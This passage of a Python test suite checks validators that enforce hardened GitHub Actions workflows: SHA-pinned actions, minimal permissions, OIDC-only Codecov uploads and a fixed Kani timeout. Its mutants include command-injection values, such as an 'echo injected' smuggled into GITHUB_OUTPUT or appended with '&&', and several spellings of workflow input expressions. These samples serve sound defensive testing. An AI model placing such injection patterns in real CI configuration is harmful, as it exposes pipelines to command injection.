        editor_line = editor_mutant.split("      continue-on-error: true\n      run: |")[0].count("\n") + 1
        self.assertEqual(
            codecov_continue_on_error_violations(editor_mutant, path="aw-editor-tests.yml"),
            [f"aw-editor-tests.yml: {editor_line}: {CODECOV_CONTINUE_MSG}"],
        )

    def _assert_continue_violation(self, text: str, needle: str, *, path: str = "coverage.yml") -> None:
        matches = [
            number
            for number, line in enumerate(text.splitlines(), start=1)
            if needle in line
        ]
        self.assertEqual(len(matches), 1, needle)
        self.assertEqual(
            codecov_continue_on_error_violations(text, path=path),
            [f"{path}: {matches[0]}: {CODECOV_CONTINUE_MSG}"],
        )

    def test_codecov_continue_on_error_expression_is_rejected(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        job_mutant = text.replace(
            "    timeout-minutes: 45\n",
            "    timeout-minutes: 45\n    continue-on-error: ${{ true }}\n",
            1,
        )
        self.assertNotEqual(job_mutant, text)
        self._assert_continue_violation(job_mutant, "continue-on-error: ${{ true }}")
        step_mutant = text.replace(
            "        uses: codecov/codecov-action@",
            "        continue-on-error: ${{ 1 == 1 }}\n        uses: codecov/codecov-action@",
            1,
        )
        self.assertNotEqual(step_mutant, text)
        self._assert_continue_violation(step_mutant, "continue-on-error: ${{ 1 == 1 }}")
        quoted_key = text.replace(
            "    timeout-minutes: 10\n",
            '    timeout-minutes: 10\n    "continue-on-error": "${{ true }}"\n',
            1,
        )
        self.assertNotEqual(quoted_key, text)
        self._assert_continue_violation(quoted_key, '"continue-on-error": "${{ true }}"')
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        outside = editor.replace(
            "    continue-on-error: true\n",
            "    continue-on-error: ${{ true }}\n",
            1,
        )
        self.assertNotEqual(outside, editor)
        self.assertEqual(
            codecov_continue_on_error_violations(outside, path="aw-editor-tests.yml"),
            [],
        )
        for spelling in (
            "false",
            "False",
            "FALSE",
            '"false"',
            '"FALSE"',
            "'False'",
            '"FaLsE"',
        ):
            allowed = text.replace(
                "    timeout-minutes: 45\n",
                f"    timeout-minutes: 45\n    continue-on-error: {spelling}\n",
                1,
            )
            self.assertEqual(
                codecov_continue_on_error_violations(allowed, path="coverage.yml"),
                [],
                spelling,
            )
            step_allowed = text.replace(
                "        uses: codecov/codecov-action@",
                f"        continue-on-error: {spelling}\n        uses: codecov/codecov-action@",
                1,
            )
            self.assertEqual(
                codecov_continue_on_error_violations(step_allowed, path="coverage.yml"),
                [],
                spelling,
            )
        quoted_false = text.replace(
            "    timeout-minutes: 45\n",
            '    timeout-minutes: 45\n    "Continue-On-Error": "false"\n',
            1,
        )
        self.assertEqual(
            codecov_continue_on_error_violations(quoted_false, path="coverage.yml"),
            [],
        )
        flow_step = """
name: codecov
on: [push, schedule, workflow_dispatch]
permissions: {}
jobs:
  coverage:
    runs-on: ubuntu-latest
    steps:
      - run: echo x
  codecov:
    needs: coverage
    runs-on: ubuntu-latest
    steps:
      - {name: up, uses: codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5, "continue-on-error": "${{ true }}"}
"""
        self._assert_continue_violation(flow_step, '"continue-on-error": "${{ true }}"')
        flow_job = """
name: codecov
on: [push, schedule, workflow_dispatch]
permissions: {}
jobs:
  coverage: {runs-on: ubuntu-latest, "continue-on-error": "${{ true }}", steps: [{run: echo x}]}
  codecov:
    needs: coverage
    runs-on: ubuntu-latest
    steps:
      - {name: up, uses: codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5}
"""
        self._assert_continue_violation(flow_job, '"continue-on-error": "${{ true }}"')
        flow_false = flow_step.replace(
            '"continue-on-error": "${{ true }}"',
            'continue-on-error: "FALSE"',
            1,
        )
        self.assertEqual(codecov_continue_on_error_violations(flow_false, path="coverage.yml"), [])
        flow_job_false = flow_job.replace(
            '"continue-on-error": "${{ true }}"',
            "continue-on-error: false",
            1,
        )
        self.assertEqual(
            codecov_continue_on_error_violations(flow_job_false, path="coverage.yml"),
            [],
        )

    def test_codecov_continue_on_error_fail_closed_mutant(self) -> None:
        """A value that is not a literal false is a violation.

        `yes`, `on`, `off`, `no`, null, and `${{ false }}` are not the word
        false. `_runner_bool_true` does not treat them as true. This test
        fails if those values are allowed again.
        """
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        cases = (
            (
                text.replace(
                    "    timeout-minutes: 45\n",
                    "    timeout-minutes: 45\n    continue-on-error: yes\n",
                    1,
                ),
                "continue-on-error: yes",
                "coverage",
                False,
            ),
            (
                text.replace(
                    "        uses: codecov/codecov-action@",
                    "        continue-on-error: ${{ false }}\n        uses: codecov/codecov-action@",
                    1,
                ),
                "continue-on-error: ${{ false }}",
                "codecov",
                True,
            ),
            (
                text.replace(
                    "    timeout-minutes: 10\n",
                    '    timeout-minutes: 10\n    "continue-on-error": on\n',
                    1,
                ),
                '"continue-on-error": on',
                "codecov",
                False,
            ),
            (
                text.replace(
                    "    timeout-minutes: 45\n",
                    "    timeout-minutes: 45\n    continue-on-error:\n",
                    1,
                ),
                "continue-on-error:",
                "coverage",
                False,
            ),
            (
                text.replace(
                    "        uses: codecov/codecov-action@",
                    "        continue-on-error: null\n        uses: codecov/codecov-action@",
                    1,
                ),
                "continue-on-error: null",
                "codecov",
                True,
            ),
        )
        flow_job = """
name: codecov
on: [push, schedule, workflow_dispatch]
permissions: {}
jobs:
  coverage: {runs-on: ubuntu-latest, continue-on-error: off, steps: [{run: echo x}]}
  codecov:
    needs: coverage
    runs-on: ubuntu-latest
    steps:
      - uses: codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5
"""
        flow_step = """
name: codecov
on: [push, schedule, workflow_dispatch]
permissions: {}
jobs:
  coverage:
    runs-on: ubuntu-latest
    steps:
      - run: echo x
  codecov:
    needs: coverage
    runs-on: ubuntu-latest
    steps:
      - {uses: codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5, "continue-on-error": no}
"""
        cases = (
            *cases,
            (flow_job, "continue-on-error: off", "coverage", False),
            (flow_step, '"continue-on-error": no', "codecov", True),
        )
        for mutant, needle, job_id, on_step in cases:
            self.assertNotEqual(mutant, text, needle)
            doc, err = load_workflow_yaml(mutant)
            self.assertIsNone(err, needle)
            self.assertIsInstance(doc, dict)
            job = doc["jobs"][job_id]
            node = job
            if on_step:
                node = next(
                    step
                    for step in job["steps"]
                    if isinstance(step, dict) and _has_ci_key(step, "continue-on-error")
                )
            self.assertFalse(_runner_bool_true(node, "continue-on-error"), needle)
            self._assert_continue_violation(mutant, needle)

    def test_quoted_uses_mutant_is_rejected(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        quoted_sha = (
            'uses: "codecov/codecov-action@'
            '303a32d7a59b442fa8d48b6a1cc6825c09c847a5" # v7.1.1\n'
        )
        self.assertEqual(third_party_action_pin_violations(quoted_sha, path="coverage.yml"), [])
        single = "uses: 'codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5'\n"
        self.assertEqual(third_party_action_pin_violations(single, path="coverage.yml"), [])
        mutant = text.replace(
            "uses: codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5 # v7.1.1",
            'uses: "codecov/codecov-action@v7"',
            1,
        )
        self.assertNotEqual(mutant, text)
        violations = third_party_action_pin_violations(mutant, path="coverage.yml")
        self.assertTrue(violations)
        self.assertIn("codecov/codecov-action@v7", violations[0])
        self.assertNotIn('"', violations[0].split("uses", 1)[-1])
        self.assertEqual(
            workflow_action_pin_violations('uses: "actions/checkout@v7"\n', path="coverage.yml"),
            [],
        )
        below = workflow_action_pin_violations(
            '      - uses: "actions/checkout@v6" # floating\n',
            path="coverage.yml",
        )
        self.assertEqual(len(below), 1)
        self.assertIn("actions/checkout@v6", below[0])
        self.assertIn(BELOW_FLOOR_MSG, below[0])
        self.assertNotIn('"', below[0])

    def test_block_scalar_uses_mutant_is_rejected(self) -> None:
        folded = "uses: >-\n  codecov/codecov-action@v7\n"
        violations = third_party_action_pin_violations(folded, path="coverage.yml")
        self.assertEqual(
            violations,
            [f"coverage.yml: 1: codecov/codecov-action@v7 {THIRD_PARTY_SHA_MSG}"],
        )
        plain = third_party_action_pin_violations(
            "uses: >\n  codecov/codecov-action@v7\n",
            path="coverage.yml",
        )
        self.assertIn("codecov/codecov-action@v7", plain[0])
        literal = third_party_action_pin_violations(
            "uses: |\n  codecov/codecov-action@v7\n",
            path="coverage.yml",
        )
        self.assertIn("codecov/codecov-action@v7", literal[0])
        strip = third_party_action_pin_violations(
            "uses: |-\n  codecov/codecov-action@v7\n",
            path="coverage.yml",
        )
        self.assertIn("codecov/codecov-action@v7", strip[0])
        quoted_master = third_party_action_pin_violations(
            'uses: "dtolnay/rust-toolchain@master"\n',
            path="kani.yml",
        )
        self.assertIn("dtolnay/rust-toolchain@master", quoted_master[0])
        self.assertNotIn('"', quoted_master[0])
        pinned = (
            "uses: >-\n"
            "  codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5\n"
        )
        self.assertEqual(third_party_action_pin_violations(pinned, path="coverage.yml"), [])
        floor = workflow_action_pin_violations(
            "      - uses: >-\n          actions/checkout@v6\n",
            path="coverage.yml",
        )
        self.assertEqual(len(floor), 1)
        self.assertIn("coverage.yml: 1:", floor[0])
        self.assertIn(BELOW_FLOOR_MSG, floor[0])
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        mutant = text.replace(
            "        uses: codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5 # v7.1.1",
            "        uses: >-\n          codecov/codecov-action@v7",
            1,
        )
        self.assertNotEqual(mutant, text)
        file_violations = third_party_action_pin_violations(mutant, path="coverage.yml")
        self.assertEqual(len(file_violations), 1)
        self.assertIn("codecov/codecov-action@v7", file_violations[0])

    def test_codecov_version_removal_mutant_is_rejected(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        self.assertEqual(codecov_fail_ci_violations(text, path="coverage.yml"), [])
        quoted = text.replace("version: v11.3.2", 'version: "v11.3.2"', 1)
        self.assertEqual(codecov_fail_ci_violations(quoted, path="coverage.yml"), [])
        removed = text.replace("          version: v11.3.2\n", "", 1)
        self.assertNotEqual(removed, text)
        upload_line = next(
            number
            for number, line in enumerate(removed.splitlines(), start=1)
            if "Upload coverage to Codecov" in line
        )
        self.assertEqual(
            codecov_fail_ci_violations(removed, path="coverage.yml"),
            [f"coverage.yml: {upload_line}: {CODECOV_VERSION_MSG}"],
        )
        latest = text.replace("version: v11.3.2", "version: latest", 1)
        self.assertIn(CODECOV_VERSION_MSG, codecov_fail_ci_violations(latest, path="coverage.yml")[0])

    def test_codecov_file_search_mutants_are_rejected(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        self.assertEqual(codecov_explicit_file_violations(text, path="coverage.yml"), [])
        self.assertEqual(codecov_explicit_file_violations(editor, path="aw-editor-tests.yml"), [])
        upload_line = next(
            number
            for number, line in enumerate(text.splitlines(), start=1)
            if "Upload coverage to Codecov" in line
        )
        no_search = text.replace("          disable_search: true\n", "", 1)
        self.assertNotEqual(no_search, text)
        self.assertEqual(
            codecov_explicit_file_violations(no_search, path="coverage.yml"),
            [f"coverage.yml: {upload_line}: {CODECOV_SEARCH_MSG}"],
        )
        no_files = text.replace(
            "          files: ./tools/astraweave-assets/coverage/cobertura.xml\n",
            "",
            1,
        )
        self.assertEqual(
            codecov_explicit_file_violations(no_files, path="coverage.yml"),
            [f"coverage.yml: {upload_line}: {CODECOV_FILES_MSG}"],
        )
        searched = text.replace("disable_search: true", "disable_search: false", 1)
        self.assertIn(
            CODECOV_SEARCH_MSG,
            codecov_explicit_file_violations(searched, path="coverage.yml")[0],
        )

    def test_codecov_oidc_mutants_are_rejected(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        self.assertNotIn("CODECOV_TOKEN", text)
        self.assertNotIn("CODECOV_TOKEN", editor)
        self.assertEqual(codecov_oidc_violations(text, path="coverage.yml"), [])
        self.assertEqual(codecov_oidc_violations(editor, path="aw-editor-tests.yml"), [])
        removed = text.replace("          use_oidc: true\n", "", 1)
        self.assertNotEqual(removed, text)
        upload_line = next(
            number
            for number, line in enumerate(removed.splitlines(), start=1)
            if "Upload coverage to Codecov" in line
        )
        self.assertEqual(
            codecov_oidc_violations(removed, path="coverage.yml"),
            [f"coverage.yml: {upload_line}: {CODECOV_OIDC_MSG}"],
        )
        disabled = text.replace("use_oidc: true", "use_oidc: false", 1)
        self.assertIn(CODECOV_OIDC_MSG, codecov_oidc_violations(disabled, path="coverage.yml")[0])
        env_only = text.replace(
            "          use_oidc: true\n",
            "        env:\n          use_oidc: true\n",
            1,
        )
        self.assertNotEqual(env_only, text)
        self.assertTrue(codecov_oidc_violations(env_only, path="coverage.yml"))
        editor_removed = editor.replace("        use_oidc: true\n", "", 1)
        self.assertNotEqual(editor_removed, editor)
        self.assertTrue(codecov_oidc_violations(editor_removed, path="aw-editor-tests.yml"))

    def test_coverage_write_permission_mutants_are_rejected(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        self.assertEqual(coverage_permission_violations(text, path="coverage.yml"), [])
        self.assertEqual(coverage_permission_violations(editor, path="aw-editor-tests.yml"), [])
        self.assertEqual(
            coverage_permission_violations("permissions: write-all\n", path="scorecard.yml"),
            [],
        )
        write_all = text.replace("permissions: {}", "permissions: write-all", 1)
        self.assertNotEqual(write_all, text)
        write_all_line = next(
            number
            for number, line in enumerate(write_all.splitlines(), start=1)
            if line.strip() == "permissions: write-all"
        )
        self.assertEqual(
            coverage_permission_violations(write_all, path="coverage.yml"),
            [f"coverage.yml: {write_all_line}: {COVERAGE_WRITE_MSG}"],
        )
        contents = text.replace("contents: read", "contents: write", 1)
        contents_line = next(
            number
            for number, line in enumerate(contents.splitlines(), start=1)
            if line.strip() == "contents: write"
        )
        self.assertEqual(
            coverage_permission_violations(contents, path="coverage.yml"),
            [
                f"coverage.yml: {contents_line - 1}: {PRODUCER_PERMISSIONS_MSG}",
                f"coverage.yml: {contents_line}: {COVERAGE_WRITE_MSG}",
            ],
        )
        actions = editor.replace(
            "      contents: read\n",
            "      contents: read\n      actions: write\n",
            1,
        )
        self.assertNotEqual(actions, editor)
        actions_line = next(
            number
            for number, line in enumerate(actions.splitlines(), start=1)
            if line.strip() == "actions: write"
        )
        self.assertEqual(
            coverage_permission_violations(actions, path="aw-editor-tests.yml"),
            [f"aw-editor-tests.yml: {actions_line}: {COVERAGE_WRITE_MSG}"],
        )
        quoted = text.replace("contents: read", 'contents: "write"', 1)
        self.assertTrue(coverage_permission_violations(quoted, path="coverage.yml"))
        dropped = text.replace("      id-token: write\n", "", 1)
        self.assertNotEqual(dropped, text)
        head, tail = dropped.split("name: Codecov upload", 1)
        perm_line = head.count("\n") + tail.split("permissions:", 1)[0].count("\n") + 1
        self.assertEqual(
            coverage_permission_violations(dropped, path="coverage.yml"),
            [f"coverage.yml: {perm_line}: {CODECOV_PERMS_MSG}"],
        )
        other_job = editor.replace(
            "    permissions:\n      contents: read\n    runs-on: ${{ matrix.os }}\n",
            "    permissions:\n      contents: read\n      id-token: write\n    runs-on: ${{ matrix.os }}\n",
            1,
        )
        self.assertNotEqual(other_job, editor)
        other_line = next(
            number
            for number, line in enumerate(other_job.splitlines(), start=1)
            if line.strip() == "id-token: write"
        )
        self.assertEqual(
            coverage_permission_violations(other_job, path="aw-editor-tests.yml"),
            [f"aw-editor-tests.yml: {other_line}: {COVERAGE_ID_TOKEN_JOB_MSG}"],
        )
        top = text.replace("permissions: {}", "permissions:\n  id-token: write", 1)
        self.assertIn(
            COVERAGE_ID_TOKEN_JOB_MSG,
            coverage_permission_violations(top, path="coverage.yml")[0],
        )

    def test_parsed_uses_shapes_are_rejected(self) -> None:
        unpinned = "codecov/codecov-action@v7"
        pinned = (
            "codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5"
        )
        shapes = {
            "space": f"uses : {unpinned}\n",
            "quoted-key": f'"uses": {unpinned}\n',
            "plain-next-line": f"uses:\n  {unpinned}\n",
            "flow": f"steps:\n  - {{uses: {unpinned}}}\n",
            "explicit-key": f"? uses\n: {unpinned}\n",
            "escaped": 'uses: "codecov/codecov-action\\u0040v7"\n',
            "multiline": 'uses: "codecov/codecov-action@\\\n  v7"\n',
            "alias": f"pin: &unpinned {unpinned}\nuses: *unpinned\n",
            "indent-chomp": f"uses: >2-\n  {unpinned}\n",
            "docker": "uses: docker://alpine:3.19\n",
        }
        for name, snippet in shapes.items():
            violations = third_party_action_pin_violations(snippet, path="coverage.yml")
            self.assertTrue(violations, name)
            if name == "docker":
                self.assertIn(DOCKER_DIGEST_MSG, violations[0])
                self.assertIn("docker://alpine:3.19", violations[0])
            else:
                self.assertIn("codecov/codecov-action@v7", violations[0], name)
                self.assertIn(THIRD_PARTY_SHA_MSG, violations[0], name)
        self.assertEqual(
            third_party_action_pin_violations(f"uses: >2-\n  {pinned}\n", path="coverage.yml"),
            [],
        )
        self.assertEqual(
            third_party_action_pin_violations(
                f"pin: &pinned {pinned}\nuses: *pinned\n",
                path="coverage.yml",
            ),
            [],
        )
        digest = "a" * 64
        self.assertEqual(
            third_party_action_pin_violations(
                f"uses: docker://alpine@sha256:{digest}\n",
                path="coverage.yml",
            ),
            [],
        )
        unknown = third_party_action_pin_violations(
            "uses: actions/not-a-real-action@main\n",
            path="coverage.yml",
        )
        self.assertTrue(unknown)
        self.assertIn("actions/not-a-real-action@main", unknown[0])
        self.assertIn(THIRD_PARTY_SHA_MSG, unknown[0])
        self.assertEqual(
            workflow_action_pin_violations("uses: actions/checkout@v7\n", path="ci.yml"),
            [],
        )
        self.assertIn(
            COVERAGE_ARTIFACT_SHA_MSG,
            coverage_artifact_pin_violations(
                "uses: actions/checkout@v7\n",
                path="coverage.yml",
            )[0],
        )
        self.assertEqual(
            third_party_action_pin_violations("uses: actions/checkout@v6\n", path="coverage.yml"),
            [],
        )

    def test_parsed_permission_mutants_are_rejected(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        self.assertEqual(coverage_permission_violations(text, path="coverage.yml"), [])
        flow = text.replace("permissions: {}", "permissions: {contents: write}", 1)
        self.assertNotEqual(flow, text)
        self.assertIn(
            COVERAGE_WRITE_MSG,
            coverage_permission_violations(flow, path="coverage.yml")[0],
        )
        flow_id = text.replace("permissions: {}", "permissions: {id-token: write}", 1)
        self.assertIn(
            COVERAGE_ID_TOKEN_JOB_MSG,
            coverage_permission_violations(flow_id, path="coverage.yml")[0],
        )
        quoted = text.replace("permissions: {}", '"permissions": {contents: write}', 1)
        self.assertIn(
            COVERAGE_WRITE_MSG,
            coverage_permission_violations(quoted, path="coverage.yml")[0],
        )
        missing = text.replace("permissions: {}\n", "", 1)
        self.assertNotEqual(missing, text)
        self.assertIn(
            TOP_PERMISSIONS_MSG,
            coverage_permission_violations(missing, path="coverage.yml")[0],
        )
        on_generate = text.replace(
            "    name: Generate Code Coverage\n    permissions:\n      contents: read\n",
            "    name: Generate Code Coverage\n    permissions:\n      contents: read\n      id-token: write\n",
            1,
        )
        self.assertNotEqual(on_generate, text)
        self.assertTrue(
            any(
                COVERAGE_ID_TOKEN_JOB_MSG in item
                for item in coverage_permission_violations(on_generate, path="coverage.yml")
            )
        )
        on_test = editor.replace(
            "    permissions:\n      contents: read\n    runs-on: ${{ matrix.os }}\n",
            "    permissions: {id-token: write, contents: read}\n    runs-on: ${{ matrix.os }}\n",
            1,
        )
        self.assertNotEqual(on_test, editor)
        self.assertIn(
            COVERAGE_ID_TOKEN_JOB_MSG,
            coverage_permission_violations(on_test, path="aw-editor-tests.yml")[0],
        )
        extra = text.replace(
            "      - name: Upload coverage to Codecov\n",
            "      - name: Extra\n        run: echo no\n      - name: Upload coverage to Codecov\n",
            1,
        )
        self.assertNotEqual(extra, text)
        extra_messages = " ".join(
            coverage_permission_violations(extra, path="coverage.yml")
        )
        self.assertIn(CODECOV_UPLOAD_JOB_MSG, extra_messages)
        self.assertIn(COVERAGE_ID_TOKEN_JOB_MSG, extra_messages)

    def test_kani_and_editor_ci_permission_mutants_are_rejected(self) -> None:
        for name in ("kani.yml", "editor-ci.yml"):
            text = (WORKFLOWS / name).read_text(encoding="utf-8")
            self.assertEqual(
                least_privilege_permission_violations(text, path=name),
                [],
                name,
            )
            missing = text.replace("permissions: {}\n", "", 1)
            self.assertNotEqual(missing, text, name)
            self.assertIn(
                TOP_PERMISSIONS_MSG,
                least_privilege_permission_violations(missing, path=name)[0],
                name,
            )
            widened = text.replace("contents: read", "contents: write", 1)
            self.assertNotEqual(widened, text, name)
            self.assertIn(
                JOB_CONTENTS_READ_MSG,
                least_privilege_permission_violations(widened, path=name)[0],
                name,
            )

    def test_upload_permissions_same_size_swap_is_rejected(self) -> None:
        """A same-size permission swap fails the exact check.

        A check that returns true for any mapping of the same length accepts
        these. The test fails if that check is forced to pass.
        """
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        self.assertTrue(_exact_upload_permissions({"contents": "read", "id-token": "write"}))
        for wrong in (
            {"actions": "read", "id-token": "write"},
            {"contents": "read", "id-token": "read"},
            {"contents": "write", "id-token": "write"},
        ):
            self.assertEqual(len(wrong), len(_UPLOAD_PERMISSIONS), wrong)
            self.assertFalse(_exact_upload_permissions(wrong), wrong)
        block = "      contents: read\n      id-token: write\n"
        for replacement in (
            "      actions: read\n      id-token: write\n",
            "      contents: read\n      id-token: read\n",
            "      contents: write\n      id-token: write\n",
        ):
            mutant = text.replace(block, replacement, 1)
            self.assertNotEqual(mutant, text, replacement)
            messages = " ".join(coverage_permission_violations(mutant, path="coverage.yml"))
            self.assertIn(CODECOV_PERMS_MSG, messages, replacement)

    def test_kani_timeout_input_is_a_number(self) -> None:
        text = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        doc, err = load_workflow_yaml(text)
        self.assertIsNone(err)
        self.assertIsInstance(doc, dict)
        trigger = doc.get(True, doc.get("on"))
        self.assertIsInstance(trigger, dict)
        timeout = trigger["workflow_dispatch"]["inputs"]["timeout"]
        self.assertEqual(timeout.get("type"), "number")
        self.assertEqual(timeout.get("default"), 300)
        self.assertEqual(kani_dispatch_args_violations(text, path="kani.yml"), [])
        args_values: list[str] = []
        for _job_id, _job, step in _iter_steps(doc):
            if not _is_named_action(step, "model-checking/kani-github-action"):
                continue
            _key, args = _ci_item(_mapping(step.get("with")), "args")
            self.assertIsInstance(args, str)
            self.assertNotIn("github.event.inputs", args)
            args_values.append(args)
        self.assertEqual(len(args_values), 4)
        self.assertTrue(all("steps.timeout.outputs.value" in value for value in args_values))
        self.assertEqual(kani_timeout_run_violations(text, path="kani.yml"), [])
        timeout_steps = [
            step
            for _job_id, _job, step in _iter_steps(doc)
            if step.get("id") == "timeout"
        ]
        self.assertEqual(len(timeout_steps), 4)
        self.assertTrue(all(step.get("run") == _KANI_TIMEOUT_RUN for step in timeout_steps))
        needle = '          echo "value=$raw" >> "$GITHUB_OUTPUT"\n'
        injected = text.replace(
            needle,
            needle + '          echo "value=300; echo injected" >> "$GITHUB_OUTPUT"\n',
            1,
        )
        self.assertNotEqual(injected, text)
        self.assertEqual(injected.count("60|120|300|600|900"), text.count("60|120|300|600|900"))
        injected_violations = kani_timeout_run_violations(injected, path="kani.yml")
        self.assertEqual(len(injected_violations), 1)
        self.assertIn(KANI_TIMEOUT_MSG, injected_violations[0])
        folded = text.replace(
            "          args: --package astraweave-ecs -Z unstable-options --harness-timeout ${{ steps.timeout.outputs.value }}\n",
            "          args: >-\n"
            "            --package astraweave-ecs -Z unstable-options --harness-timeout ${{ steps.timeout.outputs.value }}\n"
            "            ${{ github.event.inputs.timeout }}\n",
            1,
        )
        self.assertNotEqual(folded, text)
        self.assertTrue(
            all(
                "github.event.inputs" not in line
                for line in folded.splitlines()
                if line.strip().startswith("args:")
            )
        )
        folded_violations = kani_dispatch_args_violations(folded, path="kani.yml")
        self.assertEqual(len(folded_violations), 1)
        self.assertIn(KANI_ARGS_MSG, folded_violations[0])

    def test_kani_args_allowlist_rejects_input_context_spellings(self) -> None:
        """Each spelling of the input context fails the args allowlist.

        The anchor is the kani-math step, not the ecs line the folded test
        edits. The non-dot spellings do not contain github.event.inputs, so
        a substring check of that one spelling stays green.
        """
        text = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        self.assertEqual(kani_dispatch_args_violations(text, path="kani.yml"), [])
        anchor = (
            "          args: --package astraweave-math -Z unstable-options "
            "--harness-timeout ${{ steps.timeout.outputs.value }}\n"
        )
        self.assertIn(anchor, text)
        spellings = {
            "dot": "${{ github.event.inputs.timeout }}",
            "bracket": "${{ github.event['inputs'].timeout }}",
            "quoted": '${{ github.event["inputs"].timeout }}',
            "whitespace": "${{ github . event . inputs . timeout }}",
            "case": "${{ GitHub.Event.Inputs.timeout }}",
            "inputs": "${{ inputs.timeout }}",
            "inputs-bracket": "${{ inputs['timeout'] }}",
            "inputs-quoted": '${{ inputs["timeout"] }}',
        }
        for name, expr in spellings.items():
            mutant = text.replace(anchor, anchor.replace("\n", f" {expr}\n", 1), 1)
            self.assertNotEqual(mutant, text, name)
            math_line = next(
                line for line in mutant.splitlines() if "astraweave-math" in line and "args:" in line
            )
            if name != "dot":
                self.assertNotIn("github.event.inputs", math_line, name)
            violations = kani_dispatch_args_violations(mutant, path="kani.yml")
            self.assertEqual(len(violations), 1, name)
            self.assertIn(KANI_ARGS_MSG, violations[0], name)
            self.assertIn("kani.yml:", violations[0], name)
        injected = text.replace(anchor, anchor.replace("\n", " && echo injected\n", 1), 1)
        injected_line = next(
            line for line in injected.splitlines() if "astraweave-math" in line and "args:" in line
        )
        self.assertNotIn("inputs", injected_line.casefold())
        self.assertIn(
            KANI_ARGS_MSG,
            kani_dispatch_args_violations(injected, path="kani.yml")[0],
        )
        swapped = text.replace(
            "--package astraweave-math -Z unstable-options",
            "--package astraweave-ecs -Z unstable-options",
            1,
        )
        self.assertNotEqual(swapped, text)
        self.assertIn(
            KANI_ARGS_MSG,
            kani_dispatch_args_violations(swapped, path="kani.yml")[0],
        )

    def test_codecov_token_secrets_and_with_placement_mutants_are_rejected(self) -> None:
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        self.assertEqual(codecov_token_violations(text, path="coverage.yml"), [])
        uses_line = (
            "        uses: codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5 # v7.1.1\n"
            "        with:\n"
        )
        other_secret = text.replace(
            "          use_oidc: true\n",
            "          use_oidc: true\n          token: ${{ secrets.UPLOAD_CREDENTIAL }}\n",
            1,
        )
        self.assertNotEqual(other_secret, text)
        self.assertNotIn("CODECOV_TOKEN", other_secret)
        self.assertIn(
            CODECOV_TOKEN_MSG,
            codecov_token_violations(other_secret, path="coverage.yml")[0],
        )
        env_secret = text.replace(
            uses_line,
            "        uses: codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5 # v7.1.1\n"
            "        env:\n"
            "          NOT_THE_TOKEN_NAME: ${{ secrets.SOME_OTHER_SECRET }}\n"
            "        with:\n",
            1,
        )
        self.assertNotEqual(env_secret, text)
        self.assertNotIn("CODECOV_TOKEN", env_secret)
        self.assertIn(
            CODECOV_TOKEN_MSG,
            codecov_token_violations(env_secret, path="coverage.yml")[0],
        )
        reintroduced = text.replace(
            uses_line,
            "        uses: codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5 # v7.1.1\n"
            "        env:\n"
            "          CODECOV_TOKEN: literal-value\n"
            "        with:\n",
            1,
        )
        self.assertNotEqual(reintroduced, text)
        self.assertIn(
            CODECOV_TOKEN_MSG,
            codecov_token_violations(reintroduced, path="coverage.yml")[0],
        )
        moved_fail = text.replace("          fail_ci_if_error: true\n", "", 1)
        moved_fail = moved_fail.replace(
            uses_line,
            "        uses: codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5 # v7.1.1\n"
            "        env:\n"
            "          fail_ci_if_error: true\n"
            "        with:\n",
            1,
        )
        self.assertNotEqual(moved_fail, text)
        self.assertIn(
            CODECOV_FAIL_CI_MSG,
            codecov_fail_ci_violations(moved_fail, path="coverage.yml")[0],
        )
        moved_version = text.replace("          version: v11.3.2\n", "", 1)
        moved_version = moved_version.replace(
            uses_line,
            "        uses: codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5 # v7.1.1\n"
            "        env:\n"
            "          version: v11.3.2\n"
            "        with:\n",
            1,
        )
        self.assertNotEqual(moved_version, text)
        self.assertIn(
            CODECOV_VERSION_MSG,
            codecov_fail_ci_violations(moved_version, path="coverage.yml")[0],
        )
        moved_search = text.replace("          disable_search: true\n", "", 1)
        moved_search = moved_search.replace(
            uses_line,
            "        uses: codecov/codecov-action@303a32d7a59b442fa8d48b6a1cc6825c09c847a5 # v7.1.1\n"
            "        disable_search: true\n"
            "        with:\n",
            1,
        )
        self.assertNotEqual(moved_search, text)
        self.assertIn(
            CODECOV_SEARCH_MSG,
            codecov_explicit_file_violations(moved_search, path="coverage.yml")[0],
        )

    def test_kani_version_and_stable_ref_mutants_are_rejected(self) -> None:
        text = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        self.assertEqual(kani_version_violations(text, path="kani.yml"), [])
